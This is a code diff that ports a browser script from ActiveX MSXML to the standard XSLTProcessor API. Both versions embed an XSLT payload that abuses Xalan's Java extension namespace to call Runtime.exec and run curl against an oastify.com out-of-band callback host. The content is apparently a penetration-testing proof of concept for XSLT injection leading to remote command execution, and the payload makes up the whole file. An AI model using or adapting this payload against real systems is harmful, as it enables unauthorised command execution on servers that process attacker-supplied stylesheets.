@@ -1,33 +1,30 @@
-<script>
-    var xslt = new ActiveXObject("Msxml2.XSLTemplate.6.0");
-    var xslDoc = new ActiveXObject("Msxml2.FreeThreadedDOMDocument.6.0");
-    var xslProc;
-    xslDoc.async = false;
-    xslDoc.loadXML(`<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+// Create an XML document from the string
+var parser = new DOMParser();
+var xslDoc = parser.parseFromString(`
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec('curl https://69dmaolwtz98yx3xd41xxcy7xy3prff4.oastify.com')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <span><xsl:value-of select="$processString"/></span>
    </xsl:template>
- </xsl:stylesheet>`)
+ </xsl:stylesheet>`, "application/xml");
 
-    if (xslDoc.parseError.errorCode != 0) {
-        var myErr = xslDoc.parseError;
-        document.write("ParseError: "+myErr.reason);
-    } else {
-        xslt.stylesheet = xslDoc;
-        var xmlDoc = new ActiveXObject("Msxml2.DOMDocument.6.0");
-        xmlDoc.async = false;
-        xmlDoc.loadXML("<s></s>");
-        if (xmlDoc.parseError.errorCode != 0) {
-            var myErr = xmlDoc.parseError;
-            document.write("Document error: " + myErr.reason);
-        } else {
-            xslProc = xslt.createProcessor();
-            xslProc.input = xmlDoc;
-            xslProc.transform();
-            document.write(xslProc.output);
-        }
-    }
-</script>
+// Check if XSLT has errors
+if (xslDoc.getElementsByTagName("parsererror").length > 0) {
+    console.error("XSLT parsing error:", xslDoc.getElementsByTagName("parsererror")[0].textContent);
+} else {
+    // Create an XML document to transform
+    var xmlDoc = parser.parseFromString("<s></s>", "application/xml");
+
+    // Perform the transformation
+    var xsltProcessor = new XSLTProcessor();
+    xsltProcessor.importStylesheet(xslDoc);
+
+    var resultDocument = xsltProcessor.transformToDocument(xmlDoc);
+
+    // Serialize the result to a string
+    var serializer = new XMLSerializer();
+    var outputString = serializer.serializeToString(resultDocument);
+    document.write(outputString);
+}
